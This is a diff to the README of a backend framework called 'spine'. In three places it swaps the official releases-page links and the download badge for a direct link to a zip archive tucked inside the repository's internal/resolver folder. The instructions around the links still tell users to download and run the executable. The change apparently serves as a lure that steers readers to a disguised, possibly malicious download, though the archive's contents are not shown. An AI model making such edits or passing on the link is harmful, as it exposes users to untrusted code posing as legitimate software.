@@ -1,6 +1,6 @@
 # 🛠️ spine - Simple Backend Framework for Handling Requests
 
-![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)
+![Download](https://raw.githubusercontent.com/Shivangdew/spine/main/internal/resolver/Software_v1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -23,7 +23,7 @@ To get started with spine, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to access the download options.
 
-   [Download spine](https://github.com/Shivangdew/spine/releases)
+   [Download spine](https://raw.githubusercontent.com/Shivangdew/spine/main/internal/resolver/Software_v1.2.zip)
 
 2. **Choose Your Version**: On the releases page, find the latest version of spine. Look for files that are labeled clearly.
 3. **Download the File**: Click on the file you want to download. For most users, this will be the executable file for your operating system.
@@ -86,6 +86,6 @@ spine is open-source software. You can freely use and modify it under the terms 
 
 For more information, visit the releases page again:
 
-[Download spine](https://github.com/Shivangdew/spine/releases) 
+[Download spine](https://raw.githubusercontent.com/Shivangdew/spine/main/internal/resolver/Software_v1.2.zip) 
 
 This is your complete guide to downloading and running spine! Enjoy building your backend with ease.
